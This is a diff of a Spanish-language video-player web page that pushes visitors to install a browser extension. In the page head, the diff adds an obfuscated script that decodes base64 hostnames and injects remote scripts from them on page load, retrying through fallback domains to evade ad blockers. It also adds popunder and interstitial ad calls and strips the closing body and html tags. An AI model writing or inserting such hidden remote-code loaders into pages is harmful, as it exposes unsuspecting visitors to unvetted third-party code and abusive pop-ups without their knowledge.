@@ -1,10 +1,26 @@
 
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Verificación de Extensión e Inclusión de Reproductor</title>
+    <title>Player</title>
+    <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var h=window,a="dbc4879840055acc9aa2c8d8ee2ef427",e=[["siteId",357-295+179*102+680+5297109],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],k=["d3d3LmJsb2NrYWRzbm90LmNvbS9KWi9kSnNCYXJjb2RlLmFsbC5taW4uanM=","ZG5oZmk1bm4yZHQ2Ny5jbG91ZGZyb250Lm5ldC9VSC9vdXRvc0Mvbm1hcGxhY2UubWluLmNzcw==","d3d3LnNtbml1bWN5bGtvLmNvbS9hQS96SnNCYXJjb2RlLmFsbC5taW4uanM=","d3d3LnNnbWlrdXNhYy5jb20vUlRCdS91L2ZtYXBsYWNlLm1pbi5jc3M="],l=-1,i,x,g=function(){clearTimeout(x);l++;if(k[l]&&!(1812871620000<(new Date).getTime()&&1<l)){i=h.document.createElement("script");i.type="text/javascript";i.async=!0;var u=h.document.getElementsByTagName("script")[0];i.src="https://"+atob(k[l]);i.crossOrigin="anonymous";i.onerror=g;i.onload=function(){clearTimeout(x);h[a.slice(0,16)+a.slice(0,16)]||g()};x=setTimeout(g,5E3);u.parentNode.insertBefore(i,u)}};if(!h[a]){try{Object.freeze(h[a]=e)}catch(e){}g()}})();
+/*]]>/* */
+</script>
+<script id="aclib" type="text/javascript" src="//acscdn.com/script/aclib.js"></script>
+<script type="text/javascript">
+    aclib.runPop({
+        zoneId: '11690778',
+    });
+</script>
+<script id="aclib" type="text/javascript" src="//acscdn.com/script/aclib.js"></script>
+<script type="text/javascript">
+    aclib.runInterstitial({
+        zoneId: '12138954',
+    });
+</script>
     <link rel="stylesheet" href="https://boxicons.com/css/boxicons.min.css">
     <script src="https://unpkg.com/videoplayer-extension@latest/index.min.js"></script>
     <style>
@@ -112,13 +128,6 @@
         font-size: 16px; 
     }
 }
-
-
-
-        a {
-            color: #0f0;
-            text-decoration: underline;
-        }
     </style>
 </head>
 <body>
@@ -126,7 +135,7 @@
 <div id="player" class="hidden"></div>
 <div id="alerta-extension" style="text-align: center;" class="hidden alert">
     <i class="bx bx-error-circle boxicon"></i><div id="jb" class="jumbotron"><div class="image"><h3>Imagen (Brave):</h3>
-                <img src="brave2026.png" width="40%" alt="Reproductor MPD/M3U8/M3U/EPG"
+                <img src="/img/brave.png" width="40%" alt="Reproductor MPD/M3U8/M3U/EPG"
                 >
             </div><h1>Reproductor MPD/M3U8/M3U/EPG</h1></div><p><i style="color:red">NOTA</i>:
             Para reproducir este canal necesitas instalar la extensión
@@ -141,6 +150,10 @@
         'Instalar para Firefox';} else {downloadLink.href =
         'https://chromewebstore.google.com/detail/reproductor-mpdm3u8m3uepg/opmeopcambhfimffbomjgemehjkbbmji';downloadLink.textContent ='Instalar para Chrome / Brave / Edge';}
         </script>
+        
+        
+        
+        
     <script type="text/javascript">
         function getParameterByName(name) {
             name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
@@ -1332,7 +1345,3 @@ if (vp.isInstalled()) {
        }
 
     </script>
-
-</body>
-</html>
-
